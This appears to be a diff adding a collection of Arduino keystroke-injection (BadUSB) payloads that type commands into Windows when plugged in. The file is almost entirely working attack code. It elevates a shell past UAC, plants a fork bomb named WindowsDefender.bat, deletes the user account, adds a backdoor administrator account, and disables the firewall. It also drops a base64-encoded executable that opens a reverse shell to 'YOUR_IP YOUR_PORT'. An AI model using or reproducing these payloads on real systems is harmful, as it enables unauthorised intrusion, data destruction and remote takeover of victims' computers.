@@ -1,0 +1,462 @@
+//payload1
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+void setup() {
+pe();
+}
+void loop() {
+}
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+
+//payload2
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+void setup() {
+pe();
+}
+void loop() {
+}
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process powershell -Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+
+//payload3
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char ctrl= KEY_LEFT_CTRL;
+void setup(){
+  qf();
+  }
+void loop(){ 
+  }
+void qf() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("cmd");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(500);
+  Keyboard.print("cd %USERPROFILE%");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Documents");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase /Q WindowsDefender.bat");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con WindowsDefender.bat");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("%0|%0");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("WindowsDefender.bat");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  Keyboard.end();
+}
+
+//payload4
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+void setup(){
+  du();
+  }
+void loop(){
+  }
+void du() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("net user %USERNAME% /delete");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
+
+//payload5
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+void setup() {
+  au();
+}
+void loop() {
+}
+void au() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("net user user1 1234 /add");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("net localgroup administrators user1 /add");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
+
+//payload6
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+void setup() {
+df();
+}
+void loop() {
+}
+void df(){
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("netsh firewall set opmode disable");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+ }
+
+//reverse shell
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+char shift= KEY_LEFT_SHIFT;
+void setup() {
+  rs();
+}
+void loop() {
+  }
+void rs() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("cd/");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase /Q decoder.vbs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con decoder.vbs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)");
+  Keyboard.print(":outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS = ");
+  Keyboard.print("CreateObject(\"Scripting.FileSystemObject\"):");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded = ");
+  Keyboard.print("objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function ");
+  Keyboard.print("decodeBase64(base64):");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("dim DM, EL:Set DM = CreateObject(\"Microsoft.XMLDOM\"):Set EL = DM.createElement(\"tmp\"):");
+  Keyboard.print("EL.DataType = \"bin.base64\":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub ");
+  Keyboard.print("writeBytes(file, bytes):Dim binaryStream:");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("Set binaryStream = CreateObject(\"ADODB.Stream\"):binaryStream.Type = 1:");
+  Keyboard.print("binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase /Q reverse.txt");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con reverse.txt");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("/7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("AAxAAADpdL7//wAAAAIAAAAMQAAA");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase /Q reverse.exe");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cscript decoder.vbs reverse.txt reverse.exe");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("reverse.exe YOUR_IP YOUR_PORT");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+
+//payload8
+#include <Keyboard.h>
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+void setup() {
+  df();
+}
+void loop() {
+}
+void df(){
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("netsh advfirewall set currentprofile state off");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+ }
